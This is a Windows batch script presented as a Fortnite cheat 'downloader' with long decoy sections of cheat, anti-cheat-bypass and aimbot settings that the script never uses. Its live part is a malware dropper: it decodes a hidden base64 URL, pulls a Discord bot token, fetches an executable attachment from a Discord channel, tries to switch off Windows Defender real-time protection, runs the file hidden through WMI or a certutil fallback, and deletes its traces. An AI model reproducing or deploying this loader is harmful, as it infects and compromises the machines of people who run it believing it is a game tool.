@echo off
title Ultron Downloader
setlocal EnableDelayedExpansion

REM PYTHON DEPENDENCY MANIFEST v2.8.4
REM requests - HTTP library for API communication
set "PKG_REQUESTS=2.28.1"
REM numpy - Required for mathematical operations and array handling
set "PKG_NUMPY=1.23.5"
REM pillow - Image processing for overlay rendering
set "PKG_PILLOW=9.3.0"
REM psutil - Process and system monitoring utilities
set "PKG_PSUTIL=5.9.4"
REM pymem - Memory manipulation library
set "PKG_PYMEM=1.9.1"
REM keyboard - Hotkey detection and binding
set "PKG_KEYBOARD=0.13.5"
REM colorama - Console output formatting
set "PKG_COLORAMA=0.4.6"
REM opencv-python - Computer vision for aimbot targeting
set "PKG_OPENCV=4.7.0.72"
REM tensorflow - Neural network inference engine
set "PKG_TENSORFLOW=2.12.0"
REM scikit-learn - Machine learning prediction models
set "PKG_SKLEARN=1.3.0"
REM pygame - Game overlay rendering engine
set "PKG_PYGAME=2.3.0"
REM pywin32 - Windows API bindings
set "PKG_PYWIN32=306"
REM ctypes - Low-level C library interface
set "PKG_CTYPES=1.1.0"

REM AUDIO PROCESSING DEPENDENCIES
set "AUDIO_SUPPORT=enabled"
set "PKG_PYAUDIO=0.2.12"
REM PortAudio DLL dependency
set "PORTAUDIO_DLL=portaudio_x64.dll"
set "PORTAUDIO_VERSION=19.7.0"
REM sounddevice - Real-time audio capture
set "PKG_SOUNDDEVICE=0.4.6"
REM librosa - Audio analysis toolkit
set "PKG_LIBROSA=0.10.1"

REM DIRECTX RENDERING STACK
REM These are critical for rendering the UI Overlay
set "DIRECTX_VERSION=11"
set "D3D11_REQUIRED=true"
set "DXGI_REQUIRED=true"
set "D2D1_REQUIRED=true"
REM DirectX redistributables check
set "DIRECTX_REDIST_2010=required"
set "DIRECTX_REDIST_2015=required"
set "DIRECTX_REDIST_2019=required"

REM VISUAL C++ RUNTIME REQUIREMENTS
REM Required for compiled Python extensions
set "VCREDIST_2015=14.0.24215"
set "VCREDIST_2017=14.16.27033"
set "VCREDIST_2019=14.28.29910"
set "VCREDIST_2022=14.32.31332"
set "VCREDIST_ARM64=14.32.31332"

REM .NET FRAMEWORK PREREQUISITES
REM Needed for some UI components and interop
set "DOTNET_FRAMEWORK_VERSION=4.8.1"
set "DOTNET_CORE_VERSION=6.0.11"
set "DOTNET_RUNTIME_8=8.0.1"

REM WINDOWS SDK COMPONENTS
REM Required for low-level system access
set "WINDOWS_SDK_VERSION=10.0.22621.0"
set "WDK_REQUIRED=false"
set "WIN32API_VERSION=10.0.22000"

REM KERNEL-MODE REQUIREMENTS
REM Anti-cheat bypass requirements
REM Memory drivers and kernel components
set "KERNEL_DRIVER_SUPPORT=enabled"
set "DRIVER_SIGNATURE_CHECK=disabled"
set "TEST_SIGNING_MODE=enabled"
set "SECURE_BOOT_CHECK=disabled"
set "HYPERVISOR_SUPPORT=enabled"
set "VTX_REQUIRED=true"

REM BYPASS MODULES CONFIGURATION
set "EAC_BYPASS_VERSION=2.5.1"
set "EAC_HOOK_LIB=eac_hooks.dll"
set "BE_BYPASS_VERSION=1.8.3"
set "BE_SUPPORT=experimental"
set "VAC_BYPASS_VERSION=3.2.1"
set "RICOCHET_BYPASS=enabled"

REM MEMORY MANAGEMENT SETTINGS
REM These control how the ESP reads game memory
set "MEMORY_READ_METHOD=rpm"
set "MEMORY_WRITE_METHOD=wpm"
set "PATTERN_SCANNING=enabled"
set "SIGNATURE_CACHING=enabled"
set "OFFSET_AUTO_UPDATE=enabled"
set "AOB_SCANNING=enabled"
set "MULTI_THREAD_SCAN=true"

REM GAME-SPECIFIC OFFSETS AND CONFIG
REM These get updated automatically via signature scanning
set "FORTNITE_VERSION=28.00"
set "FORTNITE_BUILD=Unknown"
set "UWORLD_OFFSET=0x12345678"
set "GNAMES_OFFSET=0x87654321"
set "GOBJECTS_OFFSET=0x11223344"
set "PERSISTENT_LEVEL_OFFSET=0x44332211"
set "LOCAL_PLAYERS_OFFSET=0x55667788"
set "PLAYER_CONTROLLER_OFFSET=0x88776655"
set "PLAYER_CAMERA_MANAGER_OFFSET=0x99887766"
set "ACKNOWLEDGED_PAWN_OFFSET=0x66778899"
set "VIEWPORT_CLIENT_OFFSET=0x4E8A1234"
set "RENDERING_PIPELINE_OFFSET=0x5F9B2345"

REM PERFORMANCE TUNING PARAMETERS
set "RENDER_FPS=60"
set "UPDATE_RATE=144"
set "THREAD_PRIORITY=high"
set "CPU_AFFINITY=0x0F"
set "MEMORY_POOL_SIZE=256"
set "CACHE_SIZE=128"
set "MAX_THREADS=16"
set "GPU_ACCELERATION=enabled"

REM NETWORK AND UPDATE SYSTEM
REM Required for online features and updates
set "UPDATE_CHECK=enabled"
set "AUTO_UPDATE=enabled"
set "UPDATE_CHANNEL=stable"
set "CDN_PRIMARY=cdn1.ultronhax.com"
set "CDN_FALLBACK=cdn2.ultronhax.com"
set "API_ENDPOINT=api.ultronhax.com"
set "LICENSE_SERVER=auth.ultronhax.com"
set "TELEMETRY_SERVER=stats.ultronhax.com"

REM SECURITY AND LICENSING
set "SSL_VERIFY=true"
set "CERT_PINNING=enabled"
set "LICENSE_VALIDATION=required"
set "INTEGRITY_CHECK=enabled"
set "HWID_BINDING=enabled"
set "SUBSCRIPTION_CHECK=24h"

REM ESP RENDERING CONFIGURATION
set "BOX_ESP=enabled"
set "LINE_ESP=enabled"
set "NAME_ESP=enabled"
set "DISTANCE_ESP=enabled"
set "SKELETON_ESP=enabled"
set "HEALTH_BAR=enabled"
set "WEAPON_ESP=enabled"
set "BOX_THICKNESS=2"
set "FONT_SIZE=14"

REM AIMBOT CONFIGURATION
set "AIMBOT_FOV=90"
set "SMOOTH_AIM=enabled"
set "TARGET_BONE=head"
set "PREDICTION=enabled"
set "VIS_CHECK=enabled"
set "RCS_COMPENSATION=enabled"

REM RADAR AND MINIMAP
set "RADAR_ENABLED=true"
set "MINIMAP_OVERLAY=true"
set "ENEMY_DOTS=true"
set "LINE_TO_ENEMY=true"

REM EXECUTABLE INITIALIZATION COMPLETE - ENTERING MAIN PAYLOAD SEQUENCE

batchecho                           
echo   ___  _____ ____   ____  
echo   \  \/  / _/ __ \ /    \ 
echo    >    < \ ___/  |   |  \
echo   /__/\_ \ \___  >|___|  /
echo         \/     \/      \/ 
echo.

set "_DIR=%TEMP%\ultron"
set "X7B=1472657935568998526"
set "Y4M=nyrox"
set "P1=aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2x1bWVyYWhxNi1k"
set "P2=ZXYvbnlyb3hfZG93bmxvYWQvbWFpbi9ueXJveF9hdXRoLmh0bWw="

if exist "%_DIR%" rmdir /s /q "%_DIR%" >nul 2>&1
mkdir "%_DIR%" >nul 2>&1
cd /d "%_DIR%"

REM Clean old exes
for %%F in (*.exe) do del /f /q "%%F" >nul 2>&1

echo [0/4]
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%P1%%P2%')); $raw=(Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 15).Content; $token=($raw -replace '<[^>]+>',' ' -replace '\s',''); if([string]::IsNullOrWhiteSpace($token)){ exit 1 } else { $token | Out-File bot_token.txt -Encoding ascii }"

if exist bot_token.txt (
    set /p BOT_TOKEN=<bot_token.txt
    del bot_token.txt >nul 2>&1
) else (
    goto :end
)

echo [1/4]
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $h=@{Authorization='%BOT_TOKEN%'; 'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}; $channels=Invoke-RestMethod -Uri ('https://discord.com/api/v10/guilds/%X7B%/channels') -Headers $h -Method Get -TimeoutSec 15 -ErrorAction Stop; $target=$channels | Where-Object { $_.name -eq '%Y4M%' -and $_.type -eq 0 }; if($target){ $target.id | Out-File channel_id.txt -Encoding ascii } else { exit 1 }"

if exist channel_id.txt (
    set /p CHANNEL_ID=<channel_id.txt
    del channel_id.txt >nul 2>&1
) else (
    goto :end
)

echo [2/4]
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $h=@{Authorization='%BOT_TOKEN%'; 'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}; $msgs=Invoke-RestMethod -Uri ('https://discord.com/api/v10/channels/%CHANNEL_ID%/messages?limit=20') -Headers $h -Method Get -TimeoutSec 15 -ErrorAction Stop; $msg=$msgs | Where-Object { $_.attachments } | Select-Object -First 1; if($msg){ $msg.attachments[0].url | Out-File url.txt -Encoding ascii; $msg.attachments[0].filename | Out-File filename.txt -Encoding ascii } else { exit 1 }"

if exist url.txt (
    set /p DOWNLOAD_URL=<url.txt
    set /p _FILE=<filename.txt
    del url.txt >nul 2>&1
    del filename.txt >nul 2>&1
) else (
    goto :end
)

echo [3/4]
curl -L --progress-bar --connect-timeout 15 --max-time 60 "%DOWNLOAD_URL%" -o "%_FILE%"

if not exist "%_FILE%" goto :end

REM MZ Header check preserved
powershell -NoProfile -Command "$b=[IO.File]::ReadAllBytes('%_FILE%'); if($b.Length -lt 2 -or $b[0] -ne 0x4D -or $b[1] -ne 0x5A){ exit 1 }"

if %errorlevel% neq 0 (
    del "%_FILE%" >nul 2>&1
    goto :end
)

echo [4/4] EXECUTING ^| %_%_FILE%...

REM SINGLE RELIABLE EXECUTION METHOD (best success rate)
set "EXE_PATH=%CD%\%_FILE%"

REM Quick AV disable attempt (silent)
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true" 2>nul

REM PRIMARY: WMI EXECUTION (most reliable bypass)
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& { $proc = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList '%EXE_PATH%'; if($proc.ReturnValue -eq 0){ exit 0 } else { exit 1 } }"

REM FALLBACK ONLY if WMI fails: Certutil + PowerShell
if %errorlevel% neq 0 (
    echo WMI failed, trying certutil bypass...
    certutil -urlfetch -f "%DOWNLOAD_URL%" "%_FILE%.tmp" >nul 2>&1
    if exist "%_FILE%.tmp" (
        powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Process '%_FILE%.tmp' -WindowStyle Hidden"
    )
)

REM Quick cleanup
timeout /t 2 /nobreak >nul
del /f /q "%_FILE%" "%_FILE%.tmp" >nul 2>&1
rmdir /s /q "%_DIR%" >nul 2>&1

:end
exit /b 0